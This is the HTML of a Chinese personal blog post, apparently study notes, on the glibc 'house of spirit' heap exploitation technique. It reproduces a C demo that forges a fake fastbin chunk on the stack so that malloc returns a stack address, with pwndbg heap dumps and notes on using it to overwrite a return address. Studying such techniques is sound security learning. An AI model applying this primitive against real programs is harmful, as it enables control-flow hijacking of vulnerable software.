@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>  
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&amp;#123;	fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\n&quot;);">
+<meta property="og:type" content="article">
+<meta property="og:title" content="6.house_of_spirit">
+<meta property="og:url" content="http://yoursite.com/2019/03/01/6.house_of_spirit/index.html">
+<meta property="og:site_name" content="ha2&#39;s blog">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&amp;#123;	fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\n&quot;);">
+<meta property="article:published_time" content="2019-02-28T16:00:06.000Z">
+<meta property="article:modified_time" content="2021-09-19T05:52:54.000Z">
+<meta property="article:author" content="ha2">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/01/6.house_of_spirit/"/>
+
+
+
+
+
+  <title>6.house_of_spirit | ha2's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ha2's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">（٩（๑>◡<๑）۶）</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/6.house_of_spirit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ha2">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha2's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">6.house_of_spirit</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-01T00:00:06+08:00">
+                2019-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0x01-malloc-1"><a href="#0x01-malloc-1" class="headerlink" title="0x01  malloc(1)"></a>0x01  malloc(1)</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">heap</span></span><br><span class="line"><span class="attr">Top Chunk:</span> <span class="number">0x603020</span></span><br><span class="line"><span class="attr">Last Remainder:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> <span class="string">FASTBIN</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x21</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x20fe1</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x603020</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x20fe1</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x02：unsigned-long-long-fake-chunks-10-attribute-aligned-16"><a href="#0x02：unsigned-long-long-fake-chunks-10-attribute-aligned-16" class="headerlink" title="0x02：unsigned long long fake_chunks[10] attribute ((aligned (16)));"></a>0x02：unsigned long long fake_chunks[10] <strong>attribute</strong> ((aligned (16)));</h3><p>这步操作怎么肥四噢？<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;fake_chunks</span><br><span class="line">$<span class="number">7</span> = (unsigned long long (*)[<span class="number">10</span>]) <span class="number">0x7fffffffde40</span></span><br><span class="line">pwndbg&gt; p fake_chunks</span><br><span class="line">$<span class="number">8</span> = &#123;<span class="number">0xff00000000</span>, <span class="number">0xff00</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x4008ed</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x4008a0</span>, <span class="number">0x4005b0</span>&#125;</span><br></pre></td></tr></table></figure><br>fakechunk的地址在栈上   </p>
+<h3 id="0x03：构造一个fastbin"><a href="#0x03：构造一个fastbin" class="headerlink" title="0x03：构造一个fastbin"></a>0x03：构造一个fastbin</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>;      <span class="comment">// this is the size</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>;    <span class="comment">// nextsize</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x04："><a href="#0x04：" class="headerlink" title="0x04："></a>0x04：</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">a</span> <span class="string">=</span> <span class="string">&amp;fake_chunks[2];</span></span><br><span class="line"><span class="string">free(a);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">heap</span> </span><br><span class="line"><span class="attr">Top Chunk:</span> <span class="number">0x603020</span></span><br><span class="line"><span class="attr">Last Remainder:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span> <span class="string">FASTBIN</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x21</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x20fe1</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x603020</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">0x20fe1</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">bins</span></span><br><span class="line"><span class="string">fastbins</span></span><br><span class="line"><span class="attr">0x20:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x30:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x40:</span> <span class="number">0x7fffffffde40</span> <span class="string">◂—</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x50:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x60:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x70:</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">0x80:</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">unsortedbin</span></span><br><span class="line"><span class="attr">all:</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">smallbins</span></span><br><span class="line"><span class="string">empty</span></span><br><span class="line"><span class="string">largebins</span></span><br><span class="line"><span class="string">empty</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x06malloc-0x30"><a href="#0x06malloc-0x30" class="headerlink" title="0x06malloc(0x30)"></a>0x06malloc(0x30)</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出：malloc(<span class="number">0x30</span>): <span class="number">0x7fffffffde50</span></span><br></pre></td></tr></table></figure>
+<p>返回了栈上的地址   </p>
+<h3 id="0x07总结"><a href="#0x07总结" class="headerlink" title="0x07总结"></a>0x07总结</h3><p>伪造一个fake_fastbin，注意这个fake_chunk的大小，要在fastbins里，太大不会被丢到fastbins里    </p>
+<p>伪造的fast_chunk被丢到对应的fastbins里去之后再申请对应大小的空间，申请的是这个被丢进来的fast_chunk。   </p>
+<p>通过构造    fake    chunk，然后将其    free<br>掉，就可以在下一次    malloc    时返回    fake    chunk    的地址，即任意我们可控的区域。</p>
+<p>house-of-spirit    是一种通过堆的    fast    bin    机制来==辅助栈溢出==的方法，一般的栈溢出漏<br>洞的利用都希望能够覆盖函数的返回地址以控制    EIP    来劫持控制流，但如果栈溢出<br>的长度无法覆盖返回地址，同时却可以覆盖栈上的一个即将被    free    的堆指针，此时<br>可以将这个指针改写为栈上的地址并在相应位置构造一个    fast    bin    块的元数据，接<br>着在    free    操作时，这个栈上的堆块被放到    fast    bin    中，下一次    malloc    对应的大小<br>时，由于    fast    bin    的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就<br>可能造成返回地址的改写。</p>
+<p>。所以利用的第一步不是去控制一个    chunk，而是==控制传<br>给    free    函数的指针==，将其指向一个    fake    chunk。所以==    fake    chunk    的伪造是关键==。  </p>
+<p>首先    malloc(1)    用于初始化内存环境，然后在    fake    chunk    区域伪造出两个    chunk。<br>另外正如上面所说的，==需要一个传递给    free    函数的可以被修改的指针==，无论是通过<br>栈溢出还是其它什么方式   </p>
+<p>PREV_INUSE        位并不影响    free<br>的过程，但         ==IS_MMAPPED        位和         NON_MAIN_ARENA        位都要为零==。其次，在    64    位 系统中fast chunk的大小要在32~128字节之间。最后，是next chunk的大小，必须大于2*SIZE_SZ（即大于16），小于av-&gt;system_mem    （即小于128kb），才能绕过对    next    chunk    大小的检查。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/01/5.unsafe_unlink/" rel="next" title="5.unsafe_unlink">
+                <i class="fa fa-chevron-left"></i> 5.unsafe_unlink
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/01/7.posion_null_byte/" rel="prev" title="7.posion_null_byte">
+                7.posion_null_byte <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">ha2</p>
+              <p class="site-description motion-element" itemprop="description">什么都可以不会，但不能学不会。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">101</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                我大佬们
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://f1aming.github.io/" title="f1aming" target="_blank">f1aming</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.hunya.io/" title="昏鸦" target="_blank">昏鸦</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-malloc-1"><span class="nav-number">1.</span> <span class="nav-text">0x01  malloc(1)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02：unsigned-long-long-fake-chunks-10-attribute-aligned-16"><span class="nav-number">2.</span> <span class="nav-text">0x02：unsigned long long fake_chunks[10] attribute ((aligned (16)));</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03：构造一个fastbin"><span class="nav-number">3.</span> <span class="nav-text">0x03：构造一个fastbin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04："><span class="nav-number">4.</span> <span class="nav-text">0x04：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06malloc-0x30"><span class="nav-number">5.</span> <span class="nav-text">0x06malloc(0x30)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07总结"><span class="nav-number">6.</span> <span class="nav-text">0x07总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha2</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
